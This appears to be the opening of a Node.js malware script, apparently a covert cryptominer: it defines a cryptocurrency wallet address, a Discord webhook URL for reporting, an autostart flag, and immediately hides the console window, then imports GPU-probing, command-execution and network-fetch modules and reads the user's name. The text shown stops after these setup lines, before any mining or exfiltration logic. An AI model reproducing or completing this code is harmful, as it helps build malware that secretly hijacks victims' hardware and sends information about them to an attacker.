const walletAddr = "47kVVZSwkxMihgH7FkR7dPXppegNxungK7r4tTNCtvDECpa3JAxZ37Nj1c1rSUV3gSE7pctFReh6aXsgs25LjyQjDb8VAL3"
const wbk = "https://discord.com/api/webhooks/"
const openDelay = 1000
const hideCnsl = true
const OnStart = true

const process = require('process');
const request = require('request');
const fs = require('fs');
const { exec } = require("child_process");
const gpuInfo = require('gpu-info');
const ConsoleWindow = require("node-hide-console-window");
if(hideCnsl === true){ConsoleWindow.hideConsole();}
const fetch = require("sync-fetch")
var os = require('os');
const urss = os.userInfo().username;
const delay = ms => new Promise(resolve => setTimeout(resolve, ms))
